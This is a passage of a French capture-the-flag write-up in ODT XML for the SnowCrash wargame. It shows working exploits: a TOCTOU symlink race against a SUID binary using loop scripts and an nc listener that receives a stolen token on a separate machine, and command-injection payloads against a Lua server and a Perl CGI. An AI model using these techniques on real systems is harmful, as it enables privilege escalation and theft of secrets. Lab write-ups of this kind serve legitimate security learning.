      <text:p text:style-name="P33"><text:soft-page-break/><text:s text:c="6"/><text:span text:style-name="T20">exit(</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">}</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">printf(</text:span><text:span text:style-name="T23">"Connected!\nSending file .. "</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">fflush(stdout);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">iVar3</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">open(pcVar6,</text:span><text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T20">(iVar3</text:span> <text:span text:style-name="T20">==</text:span> <text:span text:style-name="T20">-</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T20">puts(</text:span><text:span text:style-name="T23">"Damn. Unable to open file"</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T20">exit(</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">}</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">__n</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">read(iVar3,local_1024,</text:span><text:span text:style-name="T27">0x1000</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T20">(__n</text:span> <text:span text:style-name="T20">==</text:span> <text:span text:style-name="T27">0xffffffff</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T20">piVar5</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">__errno_location();</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T20">pcVar6</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">strerror(*piVar5);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T20">printf(</text:span><text:span text:style-name="T23">"Unable to read from file: %s\n"</text:span><text:span text:style-name="T20">,pcVar6);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T20">exit(</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">}</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">write(iVar2,local_1024,__n);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">iVar2</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">puts(</text:span><text:span text:style-name="T23">"wrote file!"</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">}</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T19">else</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">iVar2</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">printf(</text:span><text:span text:style-name="T23">"You don\'t have access to %s\n"</text:span><text:span text:style-name="T20">,pcVar6);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">}</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T20">(local_14</text:span> <text:span text:style-name="T20">!=</text:span> <text:span text:style-name="T20">*(</text:span><text:span text:style-name="T19">int</text:span> <text:span text:style-name="T20">*)(in_GS_OFFSET</text:span> <text:span text:style-name="T20">+</text:span> <text:span text:style-name="T27">0x14</text:span><text:span text:style-name="T20">))</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">__stack_chk_fail();</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">}</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T19">return</text:span> <text:span text:style-name="T20">iVar2;</text:span></text:p>
      <text:p text:style-name="P30">}</text:p>
      <text:p text:style-name="P3">La partie importante du code ici, plus que la façon dont le fichier est envoyé, est qu'il a la structure suivante :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">iVar2</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">access(argv[</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">],</text:span><text:span text:style-name="T27">4</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P39"><text:s text:c="2"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T20">(iVar2</text:span> <text:span text:style-name="T20">==</text:span> <text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P36"><text:tab/>[Connection...]</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T20"><text:tab/>iVar3 = open(pcVar6,</text:span><text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P36"><text:tab/>[Writing file...]</text:p>
      <text:p text:style-name="P36">} else {</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T20"><text:tab/>iVar2 = printf(</text:span><text:span text:style-name="T23">"You don\'t have access to %s\n"</text:span><text:span text:style-name="T20">,pcVar6);</text:span></text:p>
      <text:p text:style-name="P36">}</text:p>
      <text:p text:style-name="P36">return iVar2;</text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On se sert donc de l'output de la fonction <text:span text:style-name="T5">access </text:span>en C afin de contrôler notre accès au fichier qu'on souhaite envoyer. Deux éléments importants sont à prendre en compte avec <text:span text:style-name="T5">access </text:span>:</text:p>
      <text:list xml:id="list8315707146228207249" text:style-name="L15">
        <text:list-item>
          <text:p text:style-name="P65">La fonction <text:span text:style-name="T5">access </text:span>déréférence bien les symlinks.</text:p>
        </text:list-item>
      </text:list>
      <text:list xml:id="list697783567351338552" text:style-name="L16">
        <text:list-item>
          <text:p text:style-name="P66"><text:span text:style-name="T18">La fonction </text:span><text:span text:style-name="T5">access</text:span><text:span text:style-name="T18"> effectue le test d'accès au fichier "</text:span><text:span text:style-name="T1">avec les UID et GID réels du processus appelant, plutôt qu'avec les IDs effectifs qui sont utilisés lorsque l'on tente une opération (par exemple, </text:span><text:span text:style-name="T3">open</text:span><text:span text:style-name="T1">) sur le fichier. Ceci permet aux programmes Set-UID de déterminer les autorisations de l'utilisateur ayant invoqué le programme</text:span>".</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:soft-page-break/>En d'autres termes, au check <text:span text:style-name="T5">access</text:span><text:span text:style-name="T18">, le</text:span> programme va tenter d'accéder au fichier avec les permissions de <text:span text:style-name="T5">level10</text:span><text:span text:style-name="T18">, et non de </text:span><text:span text:style-name="T5">flag10</text:span><text:span text:style-name="T18">, alors même que le programme est SUID et que le créateur est flag10.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P10"><text:span text:style-name="T18">Si l'on essaie d'accéder au fichier </text:span><text:span text:style-name="T5">token</text:span><text:span text:style-name="T18">, auquel </text:span><text:span text:style-name="T5">level10 </text:span><text:span text:style-name="T18">n'a pas l'autorisation d'accès, la fonction </text:span><text:span text:style-name="T5">access</text:span><text:span text:style-name="T18"> renverra donc une valeur négative, et on se fera jeter du programme.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P10"><text:span text:style-name="T18">Là où c'est intéressant cependant, c'est qu'un programme auquel je n'ai pas accès mais auquel flag10 a accès (comme token) serait rejeté par la fonction </text:span><text:span text:style-name="T5">access</text:span><text:span text:style-name="T18">, mais serait ensuite accepté par la fonction </text:span><text:span text:style-name="T5">open</text:span><text:span text:style-name="T18">.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Avec cela en tête, que se passerait-t-il si :</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T18">&gt; Je crée un fichier /tmp/link, vide, auquel j'ai accès en tant que </text:span><text:span text:style-name="T5">level10</text:span><text:span text:style-name="T18">.</text:span></text:p>
      <text:p text:style-name="P3">&gt; Je lance le programme, la fonction access() confirme que le fichier existe, et que j'y ai accès.</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T18">&gt; </text:span><text:span text:style-name="T5">Entre l'appel à access et l'appel à open, je transforme le fichier /tmp/link en symlink, pointant sur notre fichier token</text:span><text:span text:style-name="T18">.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T18">&gt; La fonction </text:span><text:span text:style-name="T5">open</text:span><text:span text:style-name="T18">, qui effectue ses opérations avec l'</text:span><text:span text:style-name="T4">effective UserID</text:span><text:span text:style-name="T8">, déréférence le symlink et ouvre bien correctement le fichier token en écriture.</text:span></text:p>
      <text:p text:style-name="P4">&gt; Le contenu de token est envoyé à l'adresse voulue.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P10"><text:span text:style-name="T8">Le tout est donc d'arriver à transformer /tmp/link d'un fichier normal à un symlink vers </text:span><text:span text:style-name="T7">token</text:span><text:span text:style-name="T8"> entre l'appel à access, et l'appel à open. Il s'agit d'une </text:span><text:span text:style-name="T7">race condition</text:span><text:span text:style-name="T8">, et on va tenter de l'exploiter avec des boucles continues :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P10"><text:span text:style-name="T8">&gt; </text:span><text:span text:style-name="T9">link_loop.sh</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P41">#!/bin/bash</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:span text:style-name="T35">while </text:span><text:span text:style-name="T36">true</text:span>; <text:span text:style-name="T35">do</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T34"><text:s text:c="4"/></text:span>touch /tmp/link</text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/>ln -s -f /home/user/level10/token /tmp/link</text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/>rm -f /tmp/link</text:p>
      <text:p text:style-name="P29">done</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; <text:span text:style-name="T33">exec_loop.sh</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P43">#!/bin/bash</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:span text:style-name="T35">while </text:span><text:span text:style-name="T36">true</text:span>; <text:span text:style-name="T35">do</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/>/home/user/level10/./level10 /tmp/link 192.168.1.5</text:p>
      <text:p text:style-name="P29">done</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; <text:span text:style-name="T33">nc_loop.sh</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P43">#!/bin/bash</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:span text:style-name="T35">while </text:span><text:span text:style-name="T36">true</text:span>; <text:span text:style-name="T35">do</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T34"><text:s text:c="4"/></text:span>nc -l -p 6969</text:p>
      <text:p text:style-name="P29">done</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">La première boucle crée constamment le fichier /tmp/link (fichier normal, accepté par <text:span text:style-name="T5">access</text:span>), puis le transforme en lien symbolique vers token, avant de le supprimer et de recommencer.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La seconde lance en boucle le binaire <text:span text:style-name="T5">level10</text:span>, avec comme cible notre machine Kali locale.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La troisième a vocation à être lancée sur notre machine Kali locale, et reçoit en boucle des données sur le port 6969.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On fait tourner les deux premiers scripts simultanément sur la machine cible SnowCrash, et le troisième sur notre machine Kali. Parmi les exécutions en boucle du binaire <text:span text:style-name="T5">level10</text:span>, certaines font s'effectuer dans la configuration "access tente d'accéder au fichier normal, open ouvre le lien symbolique", envoyant à notre machine Kali le contenu de <text:span text:style-name="T5">token</text:span> :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images39" text:anchor-type="paragraph" svg:width="7.331cm" svg:height="3.918cm" draw:z-index="38"><draw:image xlink:href="Pictures/2000000700001CA200000F4DBD099AB6.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">On récupère le <text:span text:style-name="T5">flag</text:span>, et on passe au <text:span text:style-name="T5">level 11</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list5169215369296394184" text:style-name="L17">
        <text:list-item>
          <text:p text:style-name="P59">Level 11</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P3">On trouve dans le dossier <text:span text:style-name="T5">home </text:span>de l'utilisateur un fichier <text:span text:style-name="T5">level11.lua</text:span>. Son contenu est le suivant (on a simplement rajouté quelques print de débug) :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P44">#!/usr/bin/env lua</text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T35">local</text:span> <text:span text:style-name="T36">socket</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T36">require(</text:span><text:span text:style-name="T37">"socket"</text:span><text:span text:style-name="T36">)</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T35">local</text:span> <text:span text:style-name="T36">server</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T36">assert(socket.bind(</text:span><text:span text:style-name="T37">"127.0.0.1"</text:span><text:span text:style-name="T36">,</text:span> <text:span text:style-name="T38">5151</text:span><text:span text:style-name="T36">))</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:span text:style-name="T35">function</text:span> <text:span text:style-name="T39">hash</text:span><text:span text:style-name="T36">(pass)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">print(</text:span><text:span text:style-name="T37">"[DEBUG] Executing : echo "</text:span><text:span text:style-name="T36">..pass..</text:span><text:span text:style-name="T37">" | sha1sum"</text:span><text:span text:style-name="T36">)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">prog</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T36">io.popen(</text:span><text:span text:style-name="T37">"echo "</text:span><text:span text:style-name="T36">..pass..</text:span><text:span text:style-name="T37">" | sha1sum"</text:span><text:span text:style-name="T36">,</text:span> <text:span text:style-name="T37">"r"</text:span><text:span text:style-name="T36">)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">data</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T36">prog:read(</text:span><text:span text:style-name="T37">"*all"</text:span><text:span text:style-name="T36">)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">print(</text:span><text:span text:style-name="T37">"[DEBUG] data is : "</text:span><text:span text:style-name="T36">..data)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">prog:close()</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">data</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T36">string.sub(data,</text:span> <text:span text:style-name="T38">1</text:span><text:span text:style-name="T36">,</text:span> <text:span text:style-name="T38">40</text:span><text:span text:style-name="T36">)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">print(</text:span><text:span text:style-name="T37">"[DEBUG] data is : "</text:span><text:span text:style-name="T36">..data)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T35">return</text:span> <text:span text:style-name="T36">data</text:span></text:p>
      <text:p text:style-name="P45">end</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:span text:style-name="T35">while</text:span> <text:span text:style-name="T38">1</text:span> <text:span text:style-name="T35">do</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T35">local</text:span> <text:span text:style-name="T36">client</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T36">server:accept()</text:span></text:p>
      <text:p text:style-name="P33"><text:soft-page-break/><text:s text:c="2"/><text:span text:style-name="T36">client:send(</text:span><text:span text:style-name="T37">"Password: "</text:span><text:span text:style-name="T36">)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">client:settimeout(</text:span><text:span text:style-name="T38">60</text:span><text:span text:style-name="T36">)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T35">local</text:span> <text:span text:style-name="T36">l,</text:span> <text:span text:style-name="T36">err</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T36">client:receive()</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T35">if</text:span> <text:span text:style-name="T36">not</text:span> <text:span text:style-name="T36">err</text:span> <text:span text:style-name="T35">then</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T36">print(</text:span><text:span text:style-name="T37">"trying "</text:span> <text:span text:style-name="T36">..</text:span> <text:span text:style-name="T36">l)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T35">local</text:span> <text:span text:style-name="T36">h</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T36">hash(l)</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T35">if</text:span> <text:span text:style-name="T36">h</text:span> <text:span text:style-name="T36">~=</text:span> <text:span text:style-name="T37">"f05d1d066fb246efe0c6f7d095f909a7a0cf34a0"</text:span> <text:span text:style-name="T35">then</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="10"/><text:span text:style-name="T36">client:send(</text:span><text:span text:style-name="T37">"Erf nope..\n"</text:span><text:span text:style-name="T36">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T35">else</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="10"/><text:span text:style-name="T36">client:send(</text:span><text:span text:style-name="T37">"Gz you dumb*\n"</text:span><text:span text:style-name="T36">)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T35">end</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T35">end</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">client:close()</text:span></text:p>
      <text:p text:style-name="P29">end</text:p>
      <text:p text:style-name="P3">On voit que ce script fait tourner un serveur sur localhost, port 5151 (ce qu'on a pu confirmer avec <text:span text:style-name="T5">netstat -tulpn</text:span>, qui nous confirme que le script tourne bien).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Ce script :</text:p>
      <text:p text:style-name="P3">&gt; Accepte la connection.</text:p>
      <text:p text:style-name="P3">&gt; Reçoit la première ligne de ce qu'envoie le client, i.e. la première ligne de la requête HTTP.</text:p>
      <text:p text:style-name="P3">&gt; Exécute la fonction <text:span text:style-name="T5">hash </text:span>sur cette première ligne. La fonction génère un hash SHA1</text:p>
      <text:p text:style-name="P3">&gt; Vérifie la valeur du hash pour retourner un message (<text:span text:style-name="T11">~=</text:span> veut dire <text:span text:style-name="T11">!=</text:span> en LUA).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On fait tourner l'application en local, et voici son fonctionnement "normal" :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images40" text:anchor-type="paragraph" svg:width="9.075cm" svg:height="2.992cm" draw:z-index="39"><draw:image xlink:href="Pictures/200000070000237400000BAFAD19511B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images41" text:anchor-type="paragraph" svg:width="14.684cm" svg:height="2.833cm" draw:z-index="40"><draw:image xlink:href="Pictures/200000070000395D00000B108D7E6B03.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">Dans le cadre de ce script, la partie intéressante est la fonction <text:span text:style-name="T5">hash</text:span>. On voit en effet que celle-ci fait appel à <text:span text:style-name="T5">io.popen</text:span>, qui exécute donc des commandes système. Et la commande exécutée est construite à partir de la concaténation de :</text:p>
      <text:p text:style-name="P3">&gt; <text:span text:style-name="T11">echo</text:span></text:p>
      <text:p text:style-name="P3">&gt; La variable <text:span text:style-name="T5">pass</text:span></text:p>
      <text:p text:style-name="P3">&gt; <text:span text:style-name="T11">| sha1sum</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On contrôle donc une partie du string qui constitue la commande système, puisque <text:span text:style-name="T5">pass </text:span>n'est rien d'autre que la première ligne de la requête HTTP envoyée par le client, qui contient l'URL que nous <text:soft-page-break/>pouvons contrôler de manière arbitraire.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Imaginons par exemple que nous envoyions l'URL suivante :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">http://127.0.0.1:5151/bla;id;echo</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La string exécutée par <text:span text:style-name="T11">io.popen</text:span> devient :</text:p>
      <text:p text:style-name="P9">echo GET /bla;id;echo HTTP/1/1 | sha1sum</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On a ici une évidente injection de commandes système qui est possible, sans même recourir à du os.execute comme on l'a fait dans la box <text:span text:style-name="T5">Luanne </text:span>(HackTheBox_Shocker3.odt).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">De là, notre payload est très simple. Le serveur ne tourne qu'en local, on passe donc par curl :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">curl 'http://127.0.0.1:5151/bla;getflag &gt; tmp/pwn;echo'</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr4" draw:name="images42" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.26cm" draw:z-index="41"><draw:image xlink:href="Pictures/200000070000485A0000099EFD1857F8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On récupère le <text:span text:style-name="T5">flag11</text:span>, et on peut passer au <text:span text:style-name="T5">level 12</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list5060662468666692480" text:style-name="L18">
        <text:list-item>
          <text:p text:style-name="P60">Level 12</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">J'ai trouvé, pour ce flag, une façon non-prévue d'obtenir RCE. Examinons l'exploit attendu, puis cette façon détournée.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">a. Intended way</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3">Dans le dossier <text:span text:style-name="T5">home </text:span>de l'utilisateur <text:span text:style-name="T5">level12</text:span>, on trouve un script PERL. On vérifie dans les fichiers de configuration de apache2 sur la machine, et ce script tourne bien sur le port 4646, en tant que l'utilisateur <text:span text:style-name="T5">flag12</text:span> :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images43" text:anchor-type="paragraph" svg:width="14.113cm" svg:height="6.122cm" draw:z-index="42"><draw:image xlink:href="Pictures/2000000700003E6E00001B15B67031B0.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">Il va donc falloir trouver un moyen d'exploit ce script. Celui-ci ressemble à ça :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P43">#!/usr/bin/env perl</text:p>
      <text:p text:style-name="P42"># localhost:4646</text:p>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P33"><text:span text:style-name="T35">use</text:span> <text:span text:style-name="T36">CGI</text:span> <text:span text:style-name="T37">qw{param}</text:span><text:span text:style-name="T36">;</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T35">print</text:span> <text:span text:style-name="T37">"Content-type: text/html\n\n"</text:span><text:span text:style-name="T36">;</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:span text:style-name="T35">sub </text:span><text:span text:style-name="T39">t</text:span> <text:span text:style-name="T36">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T34">$nn</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T34">$_</text:span><text:span text:style-name="T36">[</text:span><text:span text:style-name="T38">1</text:span><text:span text:style-name="T36">];</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T34">$xx</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T34">$_</text:span><text:span text:style-name="T36">[</text:span><text:span text:style-name="T38">0</text:span><text:span text:style-name="T36">];</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T34">$xx</text:span> <text:span text:style-name="T36">=~</text:span> <text:span text:style-name="T36">tr</text:span><text:span text:style-name="T37">/a-z/</text:span><text:span text:style-name="T36">A-Z/;</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T34">$xx</text:span> <text:span text:style-name="T36">=~</text:span> <text:span text:style-name="T37">s/\s.*//</text:span><text:span text:style-name="T36">;</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T34">@output</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T37">`egrep "^$xx" /tmp/xd 2&gt;&amp;1`</text:span><text:span text:style-name="T36">;</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T35">foreach</text:span> <text:span text:style-name="T34">$line</text:span> <text:span text:style-name="T36">(</text:span><text:span text:style-name="T34">@output</text:span><text:span text:style-name="T36">)</text:span> <text:span text:style-name="T36">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T36">(</text:span><text:span text:style-name="T34">$f</text:span><text:span text:style-name="T36">,</text:span> <text:span text:style-name="T34">$s</text:span><text:span text:style-name="T36">)</text:span> <text:span text:style-name="T36">=</text:span> <text:span text:style-name="T36">split(</text:span><text:span text:style-name="T37">/:/</text:span><text:span text:style-name="T36">,</text:span> <text:span text:style-name="T34">$line</text:span><text:span text:style-name="T36">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T35">if</text:span><text:span text:style-name="T36">(</text:span><text:span text:style-name="T34">$s</text:span> <text:span text:style-name="T36">=~</text:span> <text:span text:style-name="T34">$nn</text:span><text:span text:style-name="T36">)</text:span> <text:span text:style-name="T36">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="10"/><text:span text:style-name="T35">return</text:span> <text:span text:style-name="T38">1</text:span><text:span text:style-name="T36">;</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T36">}</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T36">}</text:span></text:p>
